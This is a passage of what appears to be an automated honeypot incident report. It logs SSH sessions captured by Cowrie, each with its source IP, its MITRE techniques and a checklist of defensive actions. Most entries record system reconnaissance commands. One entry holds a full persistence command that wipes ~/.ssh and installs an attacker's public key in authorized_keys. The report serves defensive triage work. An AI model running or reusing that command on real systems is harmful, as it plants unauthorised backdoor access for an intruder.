- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-498ed86f67da

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:55 |
| **Last Seen** | 2026-07-24 07:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:55:01` | `cowrie.session.connect` |
| `2026-07-24 07:55:01` | `cowrie.client.version` |
| `2026-07-24 07:55:01` | `cowrie.client.kex` |
| `2026-07-24 07:55:02` | `cowrie.login.success` |
| `2026-07-24 07:55:02` | `cowrie.session.params` |
| `2026-07-24 07:55:02` | `cowrie.command.input` |
| `2026-07-24 07:55:02` | `cowrie.log.closed` |
| `2026-07-24 07:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd8c1c08791d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:55 |
| **Last Seen** | 2026-07-24 07:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:55:36` | `cowrie.session.connect` |
| `2026-07-24 07:55:36` | `cowrie.client.version` |
| `2026-07-24 07:55:36` | `cowrie.client.kex` |
| `2026-07-24 07:55:38` | `cowrie.login.success` |
| `2026-07-24 07:55:39` | `cowrie.session.params` |
| `2026-07-24 07:55:39` | `cowrie.command.input` |
| `2026-07-24 07:55:39` | `cowrie.command.input` |
| `2026-07-24 07:55:39` | `cowrie.command.input` |
| `2026-07-24 07:55:39` | `cowrie.command.input` |
| `2026-07-24 07:55:39` | `cowrie.command.input` |
| `2026-07-24 07:55:39` | `cowrie.command.success` |
| `2026-07-24 07:55:39` | `cowrie.command.input` |
| `2026-07-24 07:55:39` | `cowrie.command.input` |
| `2026-07-24 07:55:39` | `cowrie.command.input` |
| `2026-07-24 07:55:39` | `cowrie.command.input` |
| `2026-07-24 07:55:40` | `cowrie.log.closed` |
| `2026-07-24 07:55:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fed0ebde092d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:56 |
| **Last Seen** | 2026-07-24 07:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:56:55` | `cowrie.session.connect` |
| `2026-07-24 07:56:55` | `cowrie.client.version` |
| `2026-07-24 07:56:55` | `cowrie.client.kex` |
| `2026-07-24 07:56:56` | `cowrie.login.success` |
| `2026-07-24 07:56:57` | `cowrie.session.params` |
| `2026-07-24 07:56:57` | `cowrie.command.input` |
| `2026-07-24 07:56:57` | `cowrie.log.closed` |
| `2026-07-24 07:56:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9d2b79a1b0c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:57 |
| **Last Seen** | 2026-07-24 07:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:57:41` | `cowrie.session.connect` |
| `2026-07-24 07:57:41` | `cowrie.client.version` |
| `2026-07-24 07:57:41` | `cowrie.client.kex` |
| `2026-07-24 07:57:43` | `cowrie.login.success` |
| `2026-07-24 07:57:45` | `cowrie.session.params` |
| `2026-07-24 07:57:45` | `cowrie.command.input` |
| `2026-07-24 07:57:45` | `cowrie.command.input` |
| `2026-07-24 07:57:45` | `cowrie.command.input` |
| `2026-07-24 07:57:45` | `cowrie.command.input` |
| `2026-07-24 07:57:45` | `cowrie.command.input` |
| `2026-07-24 07:57:45` | `cowrie.command.success` |
| `2026-07-24 07:57:45` | `cowrie.command.input` |
| `2026-07-24 07:57:45` | `cowrie.command.input` |
| `2026-07-24 07:57:45` | `cowrie.command.input` |
| `2026-07-24 07:57:45` | `cowrie.command.input` |
| `2026-07-24 07:57:45` | `cowrie.log.closed` |
| `2026-07-24 07:57:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4bba41307bd

| Field | Detail |
|---|---|
| **Source IP** | `178.27.90[.]142` |
| **First Seen** | 2026-07-24 07:57 |
| **Last Seen** | 2026-07-24 07:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:57:53` | `cowrie.session.connect` |
| `2026-07-24 07:57:53` | `cowrie.client.version` |
| `2026-07-24 07:57:53` | `cowrie.client.kex` |
| `2026-07-24 07:57:54` | `cowrie.login.success` |
| `2026-07-24 07:57:55` | `cowrie.session.params` |
| `2026-07-24 07:57:55` | `cowrie.command.input` |
| `2026-07-24 07:57:55` | `cowrie.command.failed` |
| `2026-07-24 07:57:55` | `cowrie.log.closed` |
| `2026-07-24 07:57:56` | `cowrie.session.params` |
| `2026-07-24 07:57:56` | `cowrie.command.input` |
| `2026-07-24 07:57:56` | `cowrie.session.file_download` |
| `2026-07-24 07:57:56` | `cowrie.log.closed` |
| `2026-07-24 07:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.27.90[.]142` to AbuseIPDB if not already reported
- [ ] Block `178.27.90[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7036af2dad5

| Field | Detail |
|---|---|
| **Source IP** | `178.27.90[.]142` |
| **First Seen** | 2026-07-24 07:57 |
| **Last Seen** | 2026-07-24 07:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:57:56` | `cowrie.session.connect` |
| `2026-07-24 07:57:56` | `cowrie.client.version` |
| `2026-07-24 07:57:56` | `cowrie.client.kex` |
| `2026-07-24 07:57:56` | `cowrie.login.success` |
| `2026-07-24 07:57:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.27.90[.]142` to AbuseIPDB if not already reported
- [ ] Block `178.27.90[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-809484c805b1

| Field | Detail |
|---|---|
| **Source IP** | `178.27.90[.]142` |
| **First Seen** | 2026-07-24 07:57 |
| **Last Seen** | 2026-07-24 07:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:57:57` | `cowrie.session.connect` |
| `2026-07-24 07:57:57` | `cowrie.client.version` |
| `2026-07-24 07:57:57` | `cowrie.client.kex` |
| `2026-07-24 07:57:57` | `cowrie.login.success` |
| `2026-07-24 07:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.27.90[.]142` to AbuseIPDB if not already reported
- [ ] Block `178.27.90[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e65af70124c9

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:58 |
| **Last Seen** | 2026-07-24 07:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:58:49` | `cowrie.session.connect` |
| `2026-07-24 07:58:49` | `cowrie.client.version` |
| `2026-07-24 07:58:49` | `cowrie.client.kex` |
| `2026-07-24 07:58:50` | `cowrie.login.success` |
| `2026-07-24 07:58:50` | `cowrie.session.params` |
| `2026-07-24 07:58:50` | `cowrie.command.input` |
| `2026-07-24 07:58:50` | `cowrie.log.closed` |
| `2026-07-24 07:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb511089e649

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:59 |
| **Last Seen** | 2026-07-24 07:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:59:34` | `cowrie.session.connect` |
| `2026-07-24 07:59:35` | `cowrie.client.version` |
| `2026-07-24 07:59:35` | `cowrie.client.kex` |
| `2026-07-24 07:59:37` | `cowrie.login.success` |
| `2026-07-24 07:59:39` | `cowrie.session.params` |
| `2026-07-24 07:59:39` | `cowrie.command.input` |
| `2026-07-24 07:59:39` | `cowrie.command.input` |
| `2026-07-24 07:59:39` | `cowrie.command.input` |
| `2026-07-24 07:59:39` | `cowrie.command.input` |
| `2026-07-24 07:59:39` | `cowrie.command.input` |
| `2026-07-24 07:59:39` | `cowrie.command.success` |
| `2026-07-24 07:59:39` | `cowrie.command.input` |
| `2026-07-24 07:59:39` | `cowrie.command.input` |
| `2026-07-24 07:59:39` | `cowrie.command.input` |
| `2026-07-24 07:59:39` | `cowrie.command.input` |
| `2026-07-24 07:59:39` | `cowrie.log.closed` |
| `2026-07-24 07:59:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daf0605dea26

| Field | Detail |
|---|---|
| **Source IP** | `117.160.131[.]100` |
| **First Seen** | 2026-07-24 07:59 |
| **Last Seen** | 2026-07-24 08:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:59:58` | `cowrie.session.connect` |
| `2026-07-24 07:59:59` | `cowrie.client.version` |
| `2026-07-24 07:59:59` | `cowrie.client.kex` |
| `2026-07-24 08:00:01` | `cowrie.login.success` |
| `2026-07-24 08:00:02` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.160.131[.]100` to AbuseIPDB if not already reported
- [ ] Block `117.160.131[.]100` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2922fbe47f8

| Field | Detail |
|---|---|
| **Source IP** | `65.20.179[.]251` |
| **First Seen** | 2026-07-24 08:00 |
| **Last Seen** | 2026-07-24 08:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:00:07` | `cowrie.session.connect` |
| `2026-07-24 08:00:08` | `cowrie.client.version` |
| `2026-07-24 08:00:08` | `cowrie.client.kex` |
| `2026-07-24 08:00:10` | `cowrie.login.success` |
| `2026-07-24 08:00:11` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:00:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.179[.]251` to AbuseIPDB if not already reported
- [ ] Block `65.20.179[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7f14cbbea1c

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:00 |
| **Last Seen** | 2026-07-24 08:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:00:38` | `cowrie.session.connect` |
| `2026-07-24 08:00:38` | `cowrie.client.version` |
| `2026-07-24 08:00:38` | `cowrie.client.kex` |
| `2026-07-24 08:00:38` | `cowrie.login.success` |
| `2026-07-24 08:00:39` | `cowrie.session.params` |
| `2026-07-24 08:00:39` | `cowrie.command.input` |
| `2026-07-24 08:00:39` | `cowrie.log.closed` |
| `2026-07-24 08:00:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9ab2b382e19

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:01 |
| **Last Seen** | 2026-07-24 08:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:01:29` | `cowrie.session.connect` |
| `2026-07-24 08:01:30` | `cowrie.client.version` |
| `2026-07-24 08:01:30` | `cowrie.client.kex` |
| `2026-07-24 08:01:31` | `cowrie.login.success` |
| `2026-07-24 08:01:32` | `cowrie.session.params` |
| `2026-07-24 08:01:32` | `cowrie.command.input` |
| `2026-07-24 08:01:32` | `cowrie.command.input` |
| `2026-07-24 08:01:32` | `cowrie.command.input` |
| `2026-07-24 08:01:32` | `cowrie.command.input` |
| `2026-07-24 08:01:32` | `cowrie.command.input` |
| `2026-07-24 08:01:32` | `cowrie.command.success` |
| `2026-07-24 08:01:32` | `cowrie.command.input` |
| `2026-07-24 08:01:32` | `cowrie.command.input` |
| `2026-07-24 08:01:32` | `cowrie.command.input` |
| `2026-07-24 08:01:32` | `cowrie.command.input` |
| `2026-07-24 08:01:33` | `cowrie.log.closed` |
| `2026-07-24 08:01:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9e577ad70c2

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:02 |
| **Last Seen** | 2026-07-24 08:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:02:31` | `cowrie.session.connect` |
| `2026-07-24 08:02:31` | `cowrie.client.version` |
| `2026-07-24 08:02:31` | `cowrie.client.kex` |
| `2026-07-24 08:02:31` | `cowrie.login.success` |
| `2026-07-24 08:02:32` | `cowrie.session.params` |
| `2026-07-24 08:02:32` | `cowrie.command.input` |
| `2026-07-24 08:02:32` | `cowrie.log.closed` |
| `2026-07-24 08:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af53de7ee512

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-24 08:03 |
| **Last Seen** | 2026-07-24 08:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:03:22` | `cowrie.session.connect` |
| `2026-07-24 08:03:22` | `cowrie.client.version` |
| `2026-07-24 08:03:22` | `cowrie.client.kex` |
| `2026-07-24 08:03:24` | `cowrie.login.success` |
| `2026-07-24 08:03:24` | `cowrie.direct-tcpip.request` |
| `2026-07-24 08:03:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2cb0dfade13

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:03 |
| **Last Seen** | 2026-07-24 08:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:03:28` | `cowrie.session.connect` |
| `2026-07-24 08:03:28` | `cowrie.client.version` |
| `2026-07-24 08:03:28` | `cowrie.client.kex` |
| `2026-07-24 08:03:31` | `cowrie.login.success` |
| `2026-07-24 08:03:32` | `cowrie.session.params` |
| `2026-07-24 08:03:32` | `cowrie.command.input` |
| `2026-07-24 08:03:32` | `cowrie.command.input` |
| `2026-07-24 08:03:32` | `cowrie.command.input` |
| `2026-07-24 08:03:32` | `cowrie.command.input` |
| `2026-07-24 08:03:32` | `cowrie.command.input` |
| `2026-07-24 08:03:32` | `cowrie.command.success` |
| `2026-07-24 08:03:32` | `cowrie.command.input` |
| `2026-07-24 08:03:32` | `cowrie.command.input` |
| `2026-07-24 08:03:32` | `cowrie.command.input` |
| `2026-07-24 08:03:32` | `cowrie.command.input` |
| `2026-07-24 08:03:33` | `cowrie.log.closed` |
| `2026-07-24 08:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f5bf1b64d90

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 08:04 |
| **Last Seen** | 2026-07-24 08:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:04:24` | `cowrie.session.connect` |
| `2026-07-24 08:04:24` | `cowrie.client.version` |
| `2026-07-24 08:04:24` | `cowrie.client.kex` |
| `2026-07-24 08:04:25` | `cowrie.login.success` |
| `2026-07-24 08:04:25` | `cowrie.session.params` |
| `2026-07-24 08:04:25` | `cowrie.command.input` |
| `2026-07-24 08:04:25` | `cowrie.log.closed` |
| `2026-07-24 08:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-410a28e72c67

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 08:05 |
| **Last Seen** | 2026-07-24 08:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 08:05:27` | `cowrie.session.connect` |
| `2026-07-24 08:05:28` | `cowrie.client.version` |
| `2026-07-24 08:05:28` | `cowrie.client.kex` |
| `2026-07-24 08:05:30` | `cowrie.login.success` |
| `2026-07-24 08:05:32` | `cowrie.session.params` |
| `2026-07-24 08:05:32` | `cowrie.command.input` |
| `2026-07-24 08:05:32` | `cowrie.command.input` |
| `2026-07-24 08:05:32` | `cowrie.command.input` |
| `2026-07-24 08:05:32` | `cowrie.command.input` |
| `2026-07-24 08:05:32` | `cowrie.command.input` |
| `2026-07-24 08:05:32` | `cowrie.command.success` |
| `2026-07-24 08:05:32` | `cowrie.command.input` |
| `2026-07-24 08:05:32` | `cowrie.command.input` |
| `2026-07-24 08:05:32` | `cowrie.command.input` |
| `2026-07-24 08:05:32` | `cowrie.command.input` |
| `2026-07-24 08:05:33` | `cowrie.log.closed` |
| `2026-07-24 08:05:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49dbb9e90157

